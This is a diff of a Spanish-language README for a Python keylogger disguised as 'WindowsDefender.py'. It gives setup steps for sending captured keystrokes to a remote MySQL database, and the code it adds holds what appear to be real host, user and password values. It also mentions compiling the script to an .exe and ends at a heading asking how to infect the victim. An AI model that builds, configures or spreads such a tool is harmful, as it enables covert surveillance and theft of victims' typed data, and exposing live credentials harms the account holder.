@@ -16,7 +16,7 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
 
 
 # Carpeta Principal
-![Archivos](https://i.imgur.com/PVN64Kv.png)
+![Archivos](https://i.imgur.com/F1i9X0j.png)
 - `Doc` = Documentación de como perzonalizar el keylogger `CustomKey.md`
 - `Compile.bat`    = Convierte el script `*.py` a `*.exe`
 - `DataCompartir.txt`    = Pequeña descripción del keylogger
@@ -157,11 +157,7 @@ def GMailOrDataBase():
 
 def timeSend(): # Tiempo de envío perzonalizado
     return 120 #Minutos                 <= Escoja su tiempo en minutos
-
-
-
 ````
-[Si usted desea modificar el keylogger lea la siguiente documentación aquí.](Doc/CustomKey.md)
 
 ## Envío mediante Base de Datos |MySQL|
 
@@ -181,7 +177,7 @@ def timeSend(): # Tiempo de envío perzonalizado
 6. Descargamos e instalamos [HeidiSQL](https://www.heidisql.com/download.php)y creamos una nueva sesión.
     
     ![](https://i.imgur.com/oOAiFL2.png)
-7. Creamos una nueva tabla con el Nombre= `keylog` y guardamos.
+7. Creamos una nueva tabla con el Nombre= `keyLog` y guardamos.
 
     ![](https://i.imgur.com/8mcP594.png)
 8. Creamos los siguientes datos con los siguiente typos de datos:
@@ -193,18 +189,42 @@ def timeSend(): # Tiempo de envío perzonalizado
                 // LONGTEXT     [Acepta 4,292.967.295 Caracteres - Aprox 4GB de Texto]
     ````
     ![](https://i.imgur.com/TrGVRMB.png)
-9. 
 
+9. Se debería ver así:
 
-10. En el apartado Data, podrá ver el registro de teclas por día
-    ![Ver log](https://i.imgur.com/o2w2WMi.png)
+    ![info Database](https://i.imgur.com/fc6s9qH.png)
 
-11. Podemos observar la base de datos con el registro de teclas obtenida.
+10. Ahora entramos a nuestro archivo `WindowsDefender.py` y buscamos y colocamos los datos de tu base de datos:
 
+````py
+# ************ Start Zone DATABASE ************* 
+def DB_HOST():
+    return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"   # Host
+def DB_USER():
+    return "udwlsyrbtldkznqo"                                       # Usuario de la base de datos
+def DB_PASS():
+    return "OR2i2dfdgWek0UDiAv4f"                                   # Contraseña de la Base de Datos
+def DB_NAME():
+    return "bh1g5gnxzw2igrvui8hq"                                   # Nombre de Base de datos
+def DB_PORT(): 
+    return "3306"                                                   # Opcional en algunos casos
+
+# ************ Fin Zone DATABASE ************* 
+def GMailOrDataBase():
+    return 1    # 1 = DataBase 
+                # 0 = Gmail
+                # (en las proximas actualizaciones , ambas a la vez)
+
+def timeSend(): # Tiempo de envío perzonalizado
+    return 3 #Minutos                 <= Escoja su tiempo en minutos
+````
+
+11. Si al ejecutar el keylogger todo salió bien, podemos ver en la base de datos el registro de teclas
     ![Fin](https://i.imgur.com/X4MxCeA.png)
 
+    ![Fin](https://i.imgur.com/axhHVlF.png)
 
-
+# [Si usted desea modificar el keylogger lea la siguiente documentación aquí.](Doc/CustomKey.md)
 
 # Método de infección:
 ___¿Cómo infecto a la victima?___
